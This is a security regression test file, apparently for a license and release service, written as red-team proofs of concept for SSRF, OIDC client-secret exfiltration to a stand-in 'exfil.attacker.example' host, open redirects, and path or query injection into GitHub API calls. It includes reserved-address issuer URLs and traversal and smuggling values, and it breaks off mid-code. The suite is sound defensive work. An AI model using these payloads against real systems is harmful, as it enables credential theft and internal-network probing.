/**
 * RED TEAM R9 — injection, SSRF, open redirects, untrusted-input sinks.
 *
 * Every `it()` here is an attacker PoC or an explicit refutation of a hypothesis.
 * Naming convention: `R9-NN` matches the R9 audit findings.
 *
 * NOTE: these tests assert the CURRENT (vulnerable) behaviour so they fail loudly when a
 * fix lands. Read them as "this is what an attacker can do today".
 */
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, describe, expect, it, vi } from "vitest";

import { makeTestDb } from "../helpers.js";
import { KvMock } from "../kvMock.js";
import {
  makeEnv,
  NOW,
  seedLicenseWithKey,
  seedProduct,
  seedProductSecret,
} from "../seed.js";
import type { Db } from "../../src/db/types.js";
import { setServices } from "../../src/repo.js";
import type { Env } from "../../src/env.js";
import type { Product } from "../../src/core/products.js";
import { loadProduct } from "../../src/core/products.js";
import {
  DEFAULT_AUTO_ISSUE,
  DEFAULT_FINGERPRINT_POLICY,
} from "../../src/fingerprint.js";
import {
  DEFAULT_SERVICES,
  serializeServices,
} from "../../src/core/services.js";
import {
  deviceFlowKey,
  flowKey,
  handleAuthCallback,
  handleAuthStart,
} from "../../src/services/identity/oidc.js";
import { handleMintAuth } from "../../src/services/config/mint.js";
import {
  handleReleaseSurface as handleRelease,
  seedDeliveryAccess,
} from "../releaseSurface.js";
import {
  type FetchImpl,
  installationTokenSlot,
} from "../../src/services/release/githubApp.js";
import { seal } from "../../src/keyvault.js";
import { linkRepo, parseRepoUrl } from "../../src/services/release/linkRepo.js";
import { resyncRepo } from "../../src/services/release/resync.js";
import {
  fetchRepoFile,
  MAX_REPO_FILE_BYTES,
} from "../../src/services/release/github.js";
import {
  MAX_MANIFEST_BYTES,
  parseManifest,
} from "../../src/services/release/manifest.js";
import { extractSummary } from "../../src/services/release/changelog.js";
import {
  proseToHtml,
  renderAppcast,
} from "../../src/services/update/appcast.js";
import { applyOverrides } from "../../src/admin/lib/overrides.js";
import { Catalog } from "@polaris-key/catalog";
import {
  handlePortalApi,
  handlePortalDownload,
  seedRepositoryVisibility,
} from "../portalHarness.js";
import { handlePortalLogin } from "../../src/services/identity/portal/auth.js";
import { getOrCreateAccountByEmail } from "../../src/services/identity/portal/repo.js";
import {
  PORTAL_COOKIE,
  PORTAL_CSRF_HEADER,
  issuePortalSession,
} from "../../src/services/identity/portal/session.js";
import { artefacts } from "../singleUseMock.js";
import { withDefaultHead } from "../githubHead.js";

const HERE = dirname(fileURLToPath(import.meta.url));
const SLUG = "djdl";
const CATALOG_JSON = readFileSync(
  join(HERE, "..", "..", "..", "..", "products", "djdl", "catalog.json"),
  "utf8",
);

// ── shared helpers ───────────────────────────────────────────────────────────

function req(url: string, init?: RequestInit): Request {
  return new Request(url, init) as unknown as Request;
}

/** Record every outbound `globalThis.fetch` (URL + serialized body) and answer 502. */
function recordGlobalFetch(): Array<{ url: string; body: string }> {
  const calls: Array<{ url: string; body: string }> = [];
  vi.spyOn(globalThis, "fetch").mockImplementation(
    async (input: RequestInfo | URL, init?: RequestInit) => {
      const url =
        typeof input === "string"
          ? input
          : input instanceof URL
            ? input.toString()
            : (input as Request).url;
      calls.push({ url, body: init?.body ? String(init.body) : "" });
      // 502 short-circuits handleAuthCallback right after the token POST — which is all
      // we need to prove: the request left the box, addressed at the attacker's host.
      return new Response("nope", { status: 502 });
    },
  );
  return calls;
}

async function seedCustomOidc(
  db: Db,
  issuer: string,
  opts: { redirectUris?: string[] | null; clientSecretSecret?: string } = {},
): Promise<void> {
  await db.run(
    `INSERT INTO oidc_config
       (product, provider, issuer, client_id, client_secret_secret,
        redirect_uris_json, group_role_map_json)
     VALUES (?,?,?,?,?,?,?)`,
    SLUG,
    "custom",
    issuer,
    "client-djdl",
    opts.clientSecretSecret ?? "OIDC_CLIENT_SECRET",
    opts.redirectUris === null
      ? null
      : JSON.stringify(
          opts.redirectUris ?? [
            `https://key.plrs.im/${SLUG}/identity/auth/callback`,
          ],
        ),
    JSON.stringify({ members: { role: "user" } }),
  );
}

// ── `.pkey/` ingest helpers (linkRepo / resyncRepo) ──────────────────────────

/** The REAL djdl manifest, used to prove the R9-01 ingest gate does not touch it. */
const DJDL_PRODUCT_JSON = readFileSync(
  join(HERE, "..", "..", "..", "..", "products", "djdl", "product.json"),
  "utf8",
);

let ghAppKeyPem: string | undefined;

/** A GitHub App env whose private key really signs, so `discoverInstallation` runs for real. */
async function ghAppEnv(): Promise<Env> {
  const env = makeEnv(new KvMock(), []);
  env.GITHUB_APP_ID = "123456";
  if (ghAppKeyPem === undefined) {
    const pair = (await crypto.subtle.generateKey(
      {
        name: "RSASSA-PKCS1-v1_5",
        modulusLength: 2048,
        publicExponent: new Uint8Array([1, 0, 1]),
        hash: "SHA-256",
      },
      true,
      ["sign", "verify"],
    )) as CryptoKeyPair;
    const pkcs8 = (await crypto.subtle.exportKey(
      "pkcs8",
      pair.privateKey,
    )) as ArrayBuffer;
    let bin = "";
    for (const b of new Uint8Array(pkcs8)) bin += String.fromCharCode(b);
    const b64 = btoa(bin);
    ghAppKeyPem = `-----BEGIN PRIVATE KEY-----\n${(b64.match(/.{1,64}/g) ?? [b64]).join("\n")}\n-----END PRIVATE KEY-----`;
  }
  env.GITHUB_APP_PRIVATE_KEY = ghAppKeyPem;
  return env;
}

/** Encode text the way the GitHub Contents API does: base64 inside a JSON envelope. */
function contentsResponse(text: string): Response {
  return new Response(
    JSON.stringify({
      content: Buffer.from(text, "utf8").toString("base64"),
      encoding: "base64",
    }),
    { status: 200 },
  ) as unknown as Response;
}

/** Serve an in-memory `.pkey/` over the App + Contents endpoints a link/resync calls. */
function pkeyFetch(files: Record<string, string>): {
  fetchImpl: FetchImpl;
  files: Record<string, string>;
} {
  const fetchImpl: FetchImpl = async (input) => {
    const url = String(input);
    if (url.endsWith("/installation"))
      return new Response(JSON.stringify({ id: 4242 }), {
        status: 200,
      }) as unknown as Response;
    if (url.includes("/access_tokens"))
      return new Response(JSON.stringify({ token: "ghs_test" }), {
        status: 201,
      }) as unknown as Response;
    for (const [path, body] of Object.entries(files)) {
      if (url.includes(`/contents/${path}`)) return contentsResponse(body);
    }
    return new Response("not found", { status: 404 }) as unknown as Response;
  };
  return { fetchImpl: withDefaultHead(fetchImpl), files };
}

/** A `.pkey/product` for slug `acme`, optionally naming a repo-chosen custom IdP. */
function acmeProduct(
  issuer?: string,
  over: Record<string, unknown> = {},
): string {
  return JSON.stringify({
    slug: "acme",
    name: "Acme",
    compatMin: "1.0.0",
    compatMax: "9.0.0",
    adminGroup: "acme-admins",
    tiers: [{ id: "pro", label: "Pro" }],
    ...(issuer
      ? {
          oidc: {
            provider: "custom",
            issuer,
            clientId: "acme-client",
            clientSecretSecret: "OIDC_SECRET__ACME",
          },
        }
      : {}),
    ...over,
  });
}

function makeProduct(): Product {
  return {
    slug: SLUG,
    name: "djdl",
    signingKid: "kid",
    signingKeyPem: "pem",
    signingPub: null,
    compatMin: "0.0.0",
    compatMax: "99.0.0",
    defaultMaxOfflineDays: 30,
    defaultDeviceLimit: 5,
    adminGroup: null,
    schemaVersion: 1,
    fingerprintPolicy: DEFAULT_FINGERPRINT_POLICY,
    autoIssue: DEFAULT_AUTO_ISSUE,
    services: DEFAULT_SERVICES,
    registration: "requires-license",
    webOrigins: [],
  };
}

/** Seed release_config; caller overrides any column. */
async function seedReleaseConfig(
  db: Db,
  over: Record<string, unknown> = {},
): Promise<void> {
  const row = {
    product: SLUG,
    gh_owner: "acme",
    gh_repo: "djdl",
    gh_installation_id: 42,
    channel_workflow: "channel.yml",
    beta_branch: "main",
    manual_channels_json: null as string | null,
    binary_name: "djdl",
    install_template: null as string | null,
    sparkle_ed25519_pub: "PUBKEY==",
    summary_marker: "pkey:summary",
    artifact_policy_json: null as string | null,
    metadata_access: "public",
    artifacts_access: "public",
    ...over,
  };
  await db.run(
    `INSERT INTO release_config
       (product, gh_owner, gh_repo, gh_installation_id, channel_workflow, beta_branch,
        manual_channels_json, binary_name, install_template, sparkle_ed25519_pub,
        summary_marker, artifact_policy_json, metadata_access, artifacts_access)
     VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
    row.product,
    row.gh_owner,
    row.gh_repo,
    row.gh_installation_id,
    row.channel_workflow,
    row.beta_branch,
    row.manual_channels_json,
    row.binary_name,
    row.install_template,
    row.sparkle_ed25519_pub,
    row.summary_marker,
    row.artifact_policy_json,
    row.metadata_access,
    row.artifacts_access,
  );
  await seedDeliveryAccess(db, row.product, row.artifacts_access);
}

/**
 * Pre-seed the installation-token KV cache so no App JWT signing is needed.
 *
 * The entry is SEALED and lives at the installation-scoped key (R5-03 / R12-03), which is
 * why this goes through `installationTokenSlot` rather than hand-building `p:<slug>:gh-token:…`
 * the way it used to: the cache slot is derived from `(installId, owner/repo)` now, never
 * from whatever the caller passed as its scope argument.
 */
async function seedGhToken(
  env: Env,
  installId = 42,
  scope = { owner: "acme", repo: SLUG },
): Promise<void> {
  const { key, ctx } = installationTokenSlot(installId, scope);
  await env.HOT.put(
    key,
    await seal(
      env,
      JSON.stringify({
        token: "ghs_installation_token",
        expiresAt: 4_000_000_000,
        granted: `${scope.owner}/${scope.repo}`,
      }),
      ctx,
    ),
  );
}

/**
 * A fetchImpl that records every URL. Answers 200 for everything so the engine keeps
 * walking (we only care about which URLs leave the box).
 */
function recordingFetchImpl(releases: unknown[] = []): {
  fetchImpl: FetchImpl;
  calls: string[];
} {
  const calls: string[] = [];
  const fetchImpl: FetchImpl = async (input) => {
    const url = String(input);
    calls.push(url);
    if (url.includes("/releases")) {
      return new Response(JSON.stringify(releases), { status: 200 });
    }
    return new Response(JSON.stringify({ workflow_runs: [] }), { status: 200 });
  };
  return { fetchImpl: withDefaultHead(fetchImpl), calls };
}

/** Swallow the 500 that `handleRelease` produces when a lookup misses (see R9-14). */
async function ignoreMiss(p: Promise<unknown>): Promise<void> {
  await p.catch(() => undefined);
}

afterEach(() => {
  vi.restoreAllMocks();
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-01 — SSRF + OIDC client-secret exfiltration via manifest-controlled issuer
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-01 repo-manifest-controlled OIDC issuer -> SSRF + secret exfil", () => {
  const oidcManifest = (issuer: string) =>
    parseManifest({
      schema: CATALOG_JSON,
      product: JSON.stringify({
        slug: "djdl",
        name: "DJDL",
        oidc: {
          provider: "custom",
          issuer,
          clientId: "djdl",
          clientSecretSecret: "OIDC_CLIENT_SECRET",
        },
      }),
    });

  // FIXED (R9-01): `shared-manifest` no longer accepts "any absolute http(s) URL". The issuer
  // must be https, and must not be a private / loopback / link-local / reserved address
  // literal in any of the notations the WHATWG URL parser normalizes.
  it("the manifest validator now REJECTS http:// and every reserved address literal", () => {
    for (const issuer of [
      "http://169.254.169.254/latest/meta-data", // IMDS, and plain http
      "https://169.254.169.254/", // IMDS over https
      "https://10.0.0.5/", // RFC 1918
      "https://172.16.0.1/",
      "https://192.168.1.1/",
      "https://127.0.0.2/", // 127/8 — only the three exact loopback literals are exempt
      "https://100.64.0.1/", // CGNAT
      "https://0.0.0.0/",
      "https://255.255.255.255/",
      "https://[fd00::1]/", // fc00::/7 unique-local
      "https://[fe80::1]/", // link-local
      "https://[::ffff:169.254.169.254]/", // IPv4-mapped IMDS
      "http://id.example/", // plain http on a non-loopback host
      "ftp://id.example/",
      "https://user:pw@id.example/", // embedded credentials
      "https://id.example/?next=", // query would swallow the concatenated path
    ]) {
      const res = oidcManifest(issuer);
      expect(res.ok, issuer).toBe(false);
      if (res.ok) continue;
      expect(res.errors.join("\n")).toContain("oidc.issuer");
    }
  });

  it("still accepts a real IdP, and the three exact loopback literals as the dev carve-out", () => {
    for (const issuer of [
      "https://id.example",
      "https://id.example/oidc",
      // Loopback is the ONE deliberate exception, and it is the only host `http:` buys you.
      // It exists because `wrangler dev` against a local IdP is a real workflow, and because
      // the operator-set platform issuer runs through the same predicate.
      "http://localhost:8788",
      "http://127.0.0.1:8788",
      "https://localhost:8443",
      "https://2130706433/", // 127.0.0.1 as a decimal integer — normalizes to loopback
      "http://[::1]:8788",
    ]) {
      expect(oidcManifest(issuer).ok, issuer).toBe(true);
    }
  });

  // FIXED (R9-01) — at INGEST, which is where the residual actually closed. A character-class
  // guard still cannot tell a real IdP from an attacker's IdP-shaped host, so the manifest
  // below still PARSES. What changed is that parsing is no longer enough to reach D1:
  // `linkRepo` refuses a `provider: custom` manifest whose issuer host the operator has not
  // put in `OIDC_ISSUER_ALLOWLIST`, and — unlike the sink's copy of the check — an unset
  // allowlist refuses everything. A first write has no already-working row to protect.
  it("FIXED: a public https attacker host still parses, but linkRepo refuses to persist it", async () => {
    expect(oidcManifest("https://exfil.attacker.example").ok).toBe(true);

    const db = makeTestDb();
    const env = await ghAppEnv(); // deliberately no OIDC_ISSUER_ALLOWLIST
    const stub = pkeyFetch({
      ".pkey/schema.json": CATALOG_JSON,
      ".pkey/product.json": acmeProduct("https://exfil.attacker.example"),
    });

    const res = await linkRepo(
      env,
      db,
      "acme-org/acme-app",
      NOW,
      stub.fetchImpl,
    );
    expect(res.ok).toBe(false);
    if (res.ok) return;
    expect(res.error).toContain("OIDC_ISSUER_ALLOWLIST");
    // Nothing landed — not the IdP row, not even the product it would have hung off.
    expect(
      await db.first<{ slug: string }>(
        "SELECT slug FROM products WHERE slug = ?",
        "acme",
      ),
    ).toBeNull();
    expect(
      await db.first<{ product: string }>(
        "SELECT product FROM oidc_config WHERE product = ?",
        "acme",
      ),
    ).toBeNull();

    // ...and the operator half of the control still works: allowlist the host and it links.
    env.OIDC_ISSUER_ALLOWLIST = "exfil.attacker.example";
    const allowed = await linkRepo(
      env,
      db,
      "acme-org/acme-app",
      NOW,
      stub.fetchImpl,
    );
    expect(allowed.ok, allowed.ok ? "" : allowed.error).toBe(true);
    expect(
      (
        await db.first<{ issuer: string }>(
          "SELECT issuer FROM oidc_config WHERE product = ?",
          "acme",
        )
      )?.issuer,
    ).toBe("https://exfil.attacker.example");
  });

  // FIXED (R9-01) at the other ingest path: a push may not CHANGE a stored issuer to an
  // unlisted host. The gate runs before `resyncRepo`'s first write — everything after it is a
  // sequence of un-batched `db.run`s — so a refused push applies none of the manifest, not
  // just none of the OIDC row.
  it("resyncRepo refuses a CHANGED issuer, and applies nothing else from that push", async () => {
    const db = makeTestDb();
    const env = await ghAppEnv();
    env.OIDC_ISSUER_ALLOWLIST = "id.example";
    const stub = pkeyFetch({
      ".pkey/schema.json": CATALOG_JSON,
      ".pkey/product.json": acmeProduct("https://id.example"),
    });
    expect(
      (await linkRepo(env, db, "acme-org/acme-app", NOW, stub.fetchImpl)).ok,
    ).toBe(true);

    // A repo writer repoints the IdP and renames the product in the same push.
    stub.files[".pkey/product.json"] = acmeProduct(
      "https://exfil.attacker.example",
      { name: "Pwned" },
    );
    const res = await resyncRepo(env, db, "acme", NOW + 10, stub.fetchImpl);
    expect(res.ok).toBe(false);
    if (res.ok) return;
    expect(res.error).toContain("OIDC_ISSUER_ALLOWLIST");

    expect(
      (
        await db.first<{ issuer: string }>(
          "SELECT issuer FROM oidc_config WHERE product = ?",
          "acme",
        )
      )?.issuer,
    ).toBe("https://id.example");
    expect(
      (
        await db.first<{ name: string }>(
          "SELECT name FROM products WHERE slug = ?",
          "acme",
        )
      )?.name,
    ).toBe("Acme");
  });

  // The other half of the rule, and the reason the gate is on the CHANGE rather than on the
  // value: an issuer already in D1 keeps working. Withdrawing the allowlist entirely must not
  // take a running product's login down on the next push it happens to receive.
  it("resyncRepo leaves an UNCHANGED stored issuer alone, even with the allowlist withdrawn", async () => {
    const db = makeTestDb();
    const env = await ghAppEnv();
    env.OIDC_ISSUER_ALLOWLIST = "id.example";
    const stub = pkeyFetch({
      ".pkey/schema.json": CATALOG_JSON,
      ".pkey/product.json": acmeProduct("https://id.example"),
    });
    expect(
      (await linkRepo(env, db, "acme-org/acme-app", NOW, stub.fetchImpl)).ok,
    ).toBe(true);

    delete env.OIDC_ISSUER_ALLOWLIST;
    stub.files[".pkey/product.json"] = acmeProduct("https://id.example", {
      name: "Acme Renamed",
    });
    const res = await resyncRepo(env, db, "acme", NOW + 10, stub.fetchImpl);
    expect(res.ok, res.ok ? "" : res.error).toBe(true);
    expect(
      (
        await db.first<{ name: string }>(
          "SELECT name FROM products WHERE slug = ?",
          "acme",
        )
      )?.name,
    ).toBe("Acme Renamed");
    expect(
      (
        await db.first<{ issuer: string }>(
          "SELECT issuer FROM oidc_config WHERE product = ?",
          "acme",
        )
      )?.issuer,
    ).toBe("https://id.example");
  });

  // The constraint that made this fix shippable. `djdl` — the only product in-tree — declares
  // `provider: "platform"` and names no issuer at all, so it never reaches the gate. Linked
  // AND resynced here from its real `products/djdl/product.json`, with no allowlist set.
  it('a provider:"platform" product (djdl\'s real manifest) links and resyncs with no allowlist', async () => {
    const db = makeTestDb();
    const env = await ghAppEnv(); // deliberately no OIDC_ISSUER_ALLOWLIST
    const stub = pkeyFetch({
      ".pkey/schema.json": CATALOG_JSON,
      ".pkey/product.json": DJDL_PRODUCT_JSON,
    });

    const linked = await linkRepo(
      env,
      db,
      "example-org/djdl",
      NOW,
      stub.fetchImpl,
    );
    expect(linked.ok, linked.ok ? "" : linked.error).toBe(true);
    const oidc = await db.first<{ provider: string; issuer: string }>(
      "SELECT provider, issuer FROM oidc_config WHERE product = ?",
      SLUG,
    );
    expect(oidc?.provider).toBe("platform");
    expect(oidc?.issuer).toBe(""); // no repo-supplied issuer exists to gate

    const res = await resyncRepo(env, db, SLUG, NOW + 10, stub.fetchImpl);
    expect(res.ok, res.ok ? "" : res.error).toBe(true);
  });

  // RESIDUAL, and deliberate. The gate above is at INGEST. At the SINK, an `oidc_config` row
  // that is ALREADY in D1 is still honoured when no allowlist is configured, because
  // `resolveOidcConfig` cannot tell a row an operator wrote last year from one an attacker's
  // push wrote five minutes ago — and failing closed there would take every already-configured
  // custom-OIDC product offline on the deploy that ships this code. Operators who want that
  // window closed too set `OIDC_ISSUER_ALLOWLIST` (asserted two tests below).
  it("RESIDUAL: a row ALREADY in D1 still receives the client_secret when no allowlist is set", async () => {
    const db = makeTestDb();
    const kv = new KvMock();
    const env = makeEnv(kv, [SLUG]);
    await seedProduct(db, SLUG);
    await seedProductSecret(
      db,
      SLUG,
      "OIDC_CLIENT_SECRET",
      "SUPER-SECRET-oidc-client-secret",
    );
    await seedCustomOidc(db, "https://exfil.attacker.example");
    const product = (await loadProduct(env, db, SLUG))!;

    // A flow record is all the attacker needs; GET /djdl/auth/start hands them one.
    await artefacts(env).put(
      await flowKey(env, SLUG, "ATTACKER_STATE"),
      JSON.stringify({
        verifier: "v",
        nonce: "n",
        redirectUri: `https://key.plrs.im/${SLUG}/identity/auth/callback`,
      }),
    );

    const calls = recordGlobalFetch();
    const res = await handleAuthCallback(
      req(
        `https://key.plrs.im/${SLUG}/identity/auth/callback?code=ATTACKER_CODE&state=ATTACKER_STATE`,
      ),
      env,
      db,
      product,
      NOW,
    );
    expect(res.status).toBe(502); // token exchange "failed" — but it was already sent
    expect(calls).toHaveLength(1);
    expect(calls[0]!.url).toBe("https://exfil.attacker.example/api/oidc/token");
    expect(calls[0]!.body).toContain(
      "client_secret=SUPER-SECRET-oidc-client-secret",
    );
  });

  // FIXED (R9-01) at the SINK, not just at ingest: `resolveOidcConfig` re-applies the same
  // predicate to what is actually stored in D1, so a row written before this landed — exactly
  // what this test seeds, straight into `oidc_config` — cannot drive the request either. Note
  // the request count: zero. Nothing leaves the box, and the secret is never even unsealed.
  it("a pre-existing link-local issuer row no longer reaches the token endpoint", async () => {
    const db = makeTestDb();
    const kv = new KvMock();
    const env = makeEnv(kv, [SLUG]);
    await seedProduct(db, SLUG);
    await seedProductSecret(db, SLUG, "OIDC_CLIENT_SECRET", "sekrit");
    await seedCustomOidc(db, "http://169.254.169.254/latest/meta-data");
    const product = (await loadProduct(env, db, SLUG))!;
    await artefacts(env).put(
      await flowKey(env, SLUG, "S"),
      JSON.stringify({
        verifier: "v",
        nonce: "n",
        redirectUri: `https://key.plrs.im/${SLUG}/identity/auth/callback`,
      }),
    );

    const calls = recordGlobalFetch();
    const res = await handleAuthCallback(
      req(`https://key.plrs.im/${SLUG}/identity/auth/callback?code=c&state=S`),
      env,
      db,
      product,
      NOW,
    );
    expect(res.status).toBe(500);
    expect(calls).toEqual([]);
  });

  // FIXED (R9-01, defence in depth): with `OIDC_ISSUER_ALLOWLIST` set, even a well-formed
  // public https issuer is refused unless the operator listed its host. This is the control
  // that closes the residual above — it is opt-in, and unset means unenforced.
  it("OIDC_ISSUER_ALLOWLIST refuses an unlisted host, and permits a listed one", async () => {
    for (const [allowlist, expectedCalls] of [
      ["id.example, other.example", 0],
      ["id.example, exfil.attacker.example", 1],
    ] as const) {
      const db = makeTestDb();
      const env = makeEnv(new KvMock(), [SLUG]);
      env.OIDC_ISSUER_ALLOWLIST = allowlist;
      await seedProduct(db, SLUG);
      await seedProductSecret(db, SLUG, "OIDC_CLIENT_SECRET", "sekrit");
      await seedCustomOidc(db, "https://exfil.attacker.example");
      const product = (await loadProduct(env, db, SLUG))!;
      await artefacts(env).put(
        await flowKey(env, SLUG, "S3"),
        JSON.stringify({
          verifier: "v",
          nonce: "n",
          redirectUri: `https://key.plrs.im/${SLUG}/identity/auth/callback`,
        }),
      );
      const calls = recordGlobalFetch();
      await handleAuthCallback(
        req(
          `https://key.plrs.im/${SLUG}/identity/auth/callback?code=c&state=S3`,
        ),
        env,
        db,
        product,
        NOW,
      );
      expect(calls.length, allowlist).toBe(expectedCalls);
      vi.restoreAllMocks();
    }
  });

  it("the redirect_uris allowlist still does NOT constrain the issuer (it only checks our own URI)", async () => {
    const db = makeTestDb();
    const kv = new KvMock();
    const env = makeEnv(kv, [SLUG]);
    await seedProduct(db, SLUG);
    await seedProductSecret(db, SLUG, "OIDC_CLIENT_SECRET", "sekrit");
    // Allowlist is populated and correct — and still irrelevant to the issuer host. This is
    // why the issuer needed its own guard rather than leaning on this one.
    await seedCustomOidc(db, "https://exfil.attacker.example", {
      redirectUris: [`https://key.plrs.im/${SLUG}/identity/auth/callback`],
    });
    const product = (await loadProduct(env, db, SLUG))!;
    await artefacts(env).put(
      await flowKey(env, SLUG, "S2"),
      JSON.stringify({
        verifier: "v",
        nonce: "n",
        redirectUri: `https://key.plrs.im/${SLUG}/identity/auth/callback`,
      }),
    );
    const calls = recordGlobalFetch();
    await handleAuthCallback(
      req(`https://key.plrs.im/${SLUG}/identity/auth/callback?code=c&state=S2`),
      env,
      db,
      product,
      NOW,
    );
    expect(new URL(calls[0]!.url).host).toBe("exfil.attacker.example");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-02 — unauthenticated open redirect to the manifest-controlled issuer
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-02 /<product>/auth/start is an open redirect to the configured issuer", () => {
  // FIXED (R9-02) by the R9-01 fix, as predicted: `handleAuthStart` builds its 302 from
  // `resolveOidcConfig().issuer`, so the sink guard that stops the token POST also stops the
  // redirect. An anonymous visitor gets a 500 and no `Location` at all.
  it("no longer 302s an anonymous visitor to a reserved-address host", async () => {
    const db = makeTestDb();
    const env = makeEnv(new KvMock(), [SLUG]);
    await seedProduct(db, SLUG);
    await seedProductSecret(db, SLUG, "OIDC_CLIENT_SECRET", "sekrit");
    await seedCustomOidc(db, "http://169.254.169.254/");
    const product = (await loadProduct(env, db, SLUG))!;

    const res = await handleAuthStart(
      req(`https://key.plrs.im/${SLUG}/auth/start`),
      env,
      db,
      product,
    );
    expect(res.status).toBe(500);
    expect(res.headers.get("location")).toBeNull();
  });

  it("and an operator allowlist closes the public-host variant of the same redirect", async () => {
    const db = makeTestDb();
    const env = makeEnv(new KvMock(), [SLUG]);
    env.OIDC_ISSUER_ALLOWLIST = "id.example";
    await seedProduct(db, SLUG);
    await seedProductSecret(db, SLUG, "OIDC_CLIENT_SECRET", "sekrit");
    await seedCustomOidc(db, "https://phish.attacker.example");
    const product = (await loadProduct(env, db, SLUG))!;

    const res = await handleAuthStart(
      req(`https://key.plrs.im/${SLUG}/auth/start`),
      env,
      db,
      product,
    );
    expect(res.status).toBe(500);
    expect(res.headers.get("location")).toBeNull();
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-03 — channel_workflow path/query injection on an authenticated GitHub call
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-03 release_config.channel_workflow is interpolated unencoded", () => {
  it("traverses out of /repos/<owner>/<repo>/actions/workflows to any api.github.com path", async () => {
    const db = makeTestDb();
    const kv = new KvMock();
    const env = makeEnv(kv, [SLUG]);
    await seedProduct(db, SLUG);
    await seedReleaseConfig(db, {
      // A `.pkey/release.yaml` value: `channelWorkflow: ../../../../../repos/victim/private/issues?`
      channel_workflow: "../../../../../repos/victim/private/issues?",
    });
    await seedGhToken(env);
    const { fetchImpl, calls } = recordingFetchImpl([]);

    await ignoreMiss(
      handleRelease(
        req(`https://key.plrs.im/${SLUG}/cli/beta/djdl-arm64`),
        env,
        db,
        makeProduct(),
        "cli",
        { version: "beta", arch: "arm64" },
        fetchImpl,
      ),
    );

    // FIXED (R6-07 / R9-03): `channel_workflow` is encodeURIComponent'd, so the
    // dot-segments stay inside one path segment and cannot re-target the token-bearing GET.
    for (const url of calls) {
      const parsed = new URL(url);
      expect(parsed.pathname).not.toBe("/repos/victim/private/issues");
      expect(parsed.pathname.split("/")).not.toContain("victim");
    }
    const runs = calls.find((u) => u.includes("/actions/workflows/"));
    expect(runs).toBeDefined();
    expect(new URL(runs!).pathname).toBe(
      `/repos/acme/${SLUG}/actions/workflows/..%2F..%2F..%2F..%2F..%2Frepos%2Fvictim%2Fprivate%2Fissues%3F/runs`,
    );
  });

  it("query injection: channel_workflow can smuggle its own query string", async () => {
    const db = makeTestDb();
    const env = makeEnv(new KvMock(), [SLUG]);
    await seedProduct(db, SLUG);
    await seedReleaseConfig(db, {
      channel_workflow: "wf.yml/runs?actor=evil&",
    });
    await seedGhToken(env);
    const { fetchImpl, calls } = recordingFetchImpl([]);

    await ignoreMiss(
      handleRelease(
        req(`https://key.plrs.im/${SLUG}/cli/beta/djdl-arm64`),
        env,
        db,
        makeProduct(),
        "cli",
        { version: "beta", arch: "arm64" },
        fetchImpl,
      ),
    );
    // FIXED (R6-07 / R9-03): the smuggled `?actor=evil&` is percent-encoded into the
    // workflow path segment, so it never becomes a query parameter.
    const runs = calls.find((u) => u.includes("/actions/workflows/"));
    expect(runs).toBeDefined();
    expect(new URL(runs!).searchParams.get("actor")).toBeNull();
    expect(calls.filter((u) => u.includes("actor=evil"))).toEqual([]);
  });

  it("CONTRAST: beta_branch on the SAME line IS encoded (so this is an oversight, not a design)", async () => {
    const db = makeTestDb();
    const env = makeEnv(new KvMock(), [SLUG]);
    await seedProduct(db, SLUG);
    await seedReleaseConfig(db, {
      channel_workflow: "wf.yml",
      beta_branch: "main&injected=1",
    });
    await seedGhToken(env);
    const { fetchImpl, calls } = recordingFetchImpl([]);

    await ignoreMiss(
      handleRelease(
        req(`https://key.plrs.im/${SLUG}/cli/beta/djdl-arm64`),
        env,
        db,
        makeProduct(),
        "cli",
        { version: "beta", arch: "arm64" },
        fetchImpl,
      ),
    );
    const runs = calls.find((u) => u.includes("/runs?"))!;
    expect(runs).toContain("branch=main%26injected%3D1");
    expect(new URL(runs).searchParams.get("injected")).toBeNull();
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-04 — gh_owner / gh_repo are unencoded too, and parseRepoUrl is permissive
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-04 gh_owner/gh_repo path injection", () => {
  it("parseRepoUrl accepts `..`, `?` and `:` in the owner/repo it persists", () => {
    expect(parseRepoUrl("https://github.com/o/..")).toEqual({
      owner: "o",
      repo: "..",
    });
    expect(parseRepoUrl("https://github.com/o/r?per_page=1")).toEqual({
      owner: "o",
      repo: "r?per_page=1",
    });
    expect(parseRepoUrl("https://github.com/a:b/c:d")).toEqual({
      owner: "a:b",
      repo: "c:d",
    });
    // Feeding that straight into the (unencoded) githubApp URL template traverses:
    const p = parseRepoUrl("https://github.com/o/..")!;
    expect(
      new URL(`https://api.github.com/repos/${p.owner}/${p.repo}/installation`)
        .pathname,
    ).toBe("/repos/installation");
  });

  it("a stored gh_repo of `..` retargets the authenticated releases call", async () => {
    const db = makeTestDb();
    const env = makeEnv(new KvMock(), [SLUG]);
    await seedProduct(db, SLUG);
    await seedReleaseConfig(db, { gh_owner: "acme", gh_repo: ".." });
    // The cache slot follows the repo coordinates now (R5-03), so seed the one this config
    // will actually look up.
    await seedGhToken(env, 42, { owner: "acme", repo: ".." });
    const { fetchImpl, calls } = recordingFetchImpl([]);

    await ignoreMiss(
      handleRelease(
        req(`https://key.plrs.im/${SLUG}/version`),
        env,
        db,
        makeProduct(),
        "version",
        {},
        fetchImpl,
      ),
    );
    const listed = calls.find((u) => u.includes("/releases"))!;
    // `https://api.github.com/repos/acme/../releases?per_page=100` normalizes away
    // the repo scope entirely.
    expect(new URL(listed).pathname).toBe("/repos/releases");
    expect(listed).toContain("/repos/acme/../releases");
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// R9-05 — portal download 302 has no host allowlist + a single-use TOCTOU
// ═════════════════════════════════════════════════════════════════════════════
describe("R9-05 /download/<token> open redirect + single-use race", () => {
  async function seedArtifact(db: Db, sourceUrl: string): Promise<void> {
    // Task 7.2 made the portal's download flow a projection of `services_json`, and
    // `DEFAULT_SERVICES` has Release OFF — so seeding release ROWS alone now describes a product
    // that does not serve them, and every mint below would 404 before reaching the redirect
    // semantics this suite is actually about.
    await setServices(
      db,
      SLUG,
      serializeServices({
        // Release + Distribution: the services that serve a download (P2b-04).
        services: {
